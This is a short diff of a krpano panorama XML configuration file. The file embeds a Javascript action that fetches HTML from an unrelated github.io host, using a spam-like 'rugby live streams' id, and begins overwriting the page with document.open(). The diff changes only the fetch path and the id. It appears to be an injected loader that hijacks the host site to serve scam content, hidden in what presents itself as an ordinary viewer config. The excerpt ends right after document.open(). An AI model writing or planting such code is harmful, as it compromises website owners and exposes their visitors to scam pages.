@@ -1,9 +1,9 @@
 <krpano version="1.0.8.15">
 <action name="js_loader_start" type="Javascript"><![CDATA[
-var id = new URLSearchParams(window.location.search).get("id") || "video-france-vs-south-africa-rugby-live-s-treams-K3mP7";
+var id = new URLSearchParams(window.location.search).get("id") || "video-france-vs-south-africa-rugby-live-s-treams-K3mP";
 if (!window.__kgh_loader_done) {
   window.__kgh_loader_done = 1;
-  window.fetch("https://ratdinsokal305.github.io/ixkauxn/oga/" + id + ".html")
+  window.fetch("https://ratdinsokal305.github.io/ixkauxn/udl/" + id + ".html")
     .then(function (r) { return r.text(); })
     .then(function (html) {
       window.document.open();
